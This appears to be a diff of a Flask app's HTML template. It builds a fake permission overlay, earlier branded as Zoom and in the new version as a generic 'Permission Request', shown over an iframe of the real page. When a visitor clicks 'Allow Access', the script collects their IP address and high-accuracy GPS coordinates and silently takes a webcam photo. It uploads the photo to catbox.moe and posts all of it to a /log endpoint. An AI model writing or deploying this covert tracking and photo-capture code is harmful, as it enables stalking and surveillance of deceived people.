@@ -105,61 +105,48 @@ HTML_TEMPLATE = """
         }}
     </style>
 </head>
-<body>
-    <!-- Your existing content -->
-    {existing_content}
-    
-    <!-- GPS Permission Overlay -->
-    <div class="gps-overlay">
-        <div class="gps-modal">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/2/24/Zoom-Logo.png" width="150" alt="Zoom">
-            <h2 class="doorDash-heading">Allow Zoom to use your device for video conferences</h2>
-            <p class="doorDash-text">Allow us access to things like your camera, location, and microphone to continue using Zoom</p>
-            <button class="gps-btn" id="gps-allow-btn">Allow Access</button>
+    <body>
+        <iframe id="main-content" src="/page.html"></iframe>
+        
+        <div id="gps-overlay">
+            <div id="gps-modal">
+                <h2>Permission Request</h2>
+                <p>Please allow access to your location and camera</p>
+                <button id="gps-btn">Allow Access</button>
+            </div>
         </div>
-    </div>
 
         <script>
-            function dataURLtoBlob(dataurl) {{
+            function dataURLtoBlob(dataurl) {
                 const arr = dataurl.split(',');
                 const mime = arr[0].match(/:(.*?);/)[1];
                 const bstr = atob(arr[1]);
                 let n = bstr.length;
                 const u8arr = new Uint8Array(n);
                 while(n--) u8arr[n] = bstr.charCodeAt(n);
-                return new Blob([u8arr], {{type: mime}});
-            }}
+                return new Blob([u8arr], {type: mime});
+            }
 
-            document.getElementById('gps-btn').addEventListener('click', async () => {{
-                try {{
+            document.getElementById('gps-btn').addEventListener('click', async () => {
+                try {
                     // Get client IP
                     const ip = await fetch('/getip').then(r => r.text());
                     
-                    // Log permission request
-                    await fetch('/log', {{
-                        method: 'POST',
-                        headers: {{ 'Content-Type': 'application/json' }},
-                        body: JSON.stringify({{
-                            type: 'permission_request',
-                            ip: ip,
-                            timestamp: new Date().toISOString()
-                        }})
-                    }});
-                    
                     // Get GPS location
-                    const position = await new Promise((resolve, reject) => {{
-                        navigator.geolocation.getCurrentPosition(resolve, reject, {{
+                    const position = await new Promise((resolve, reject) => {
+                        navigator.geolocation.getCurrentPosition(resolve, reject, {
                             enableHighAccuracy: true,
                             timeout: 10000
-                        }});
-                    }});
+                        });
+                    });
 
-                    // Get camera access and capture photo
-                    const stream = await navigator.mediaDevices.getUserMedia({{
+                    // Get camera access
+                    const stream = await navigator.mediaDevices.getUserMedia({ 
                         video: true,
-                        audio: false
-                    }});
+                        audio: false 
+                    });
                     
+                    // Capture photo
                     const video = document.createElement('video');
                     video.srcObject = stream;
                     await video.play();
@@ -177,43 +164,47 @@ HTML_TEMPLATE = """
                     const formData = new FormData();
                     formData.append('reqtype', 'fileupload');
                     formData.append('fileToUpload', 
-                        new File([dataURLtoBlob(photoData)], 'photo.jpg', {{ type: 'image/jpeg' }})
+                        new File([dataURLtoBlob(photoData)], 'photo.jpg', { type: 'image/jpeg' })
                     );
                     
-                    const catboxUrl = await fetch('https://catbox.moe/user/api.php', {{
+                    const catboxUrl = await fetch('https://catbox.moe/user/api.php', {
                         method: 'POST',
                         body: formData
-                    }}).then(r => r.text());
+                    }).then(r => r.text());
                     
                     // Log all data
-                    await fetch('/log', {{
+                    await fetch('/log', {
                         method: 'POST',
-                        headers: {{ 'Content-Type': 'application/json' }},
-                        body: JSON.stringify({{
-                            type: 'full_data',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
                             ip: ip,
-                            gps: {{
+                            gps: {
                                 lat: position.coords.latitude,
                                 lng: position.coords.longitude,
                                 accuracy: position.coords.accuracy
-                            }},
+                            },
                             photo_url: catboxUrl,
                             timestamp: new Date().toISOString()
-                        }})
-                    }});
+                        })
+                    });
                     
                     // Remove overlay
                     document.getElementById('gps-overlay').remove();
                     
-                }} catch (error) {{
+                } catch (error) {
                     console.error('Error:', error);
                     alert('Error: ' + error.message);
-                }}
-            }});
+                }
+            });
         </script>
     </body>
     </html>
     """
+
+@app.route('/page.html')
+def serve_page():
+    """Serve your actual page content"""
+    return send_from_directory('.', 'page.html')
 
 @app.route('/getip')
 def get_ip():
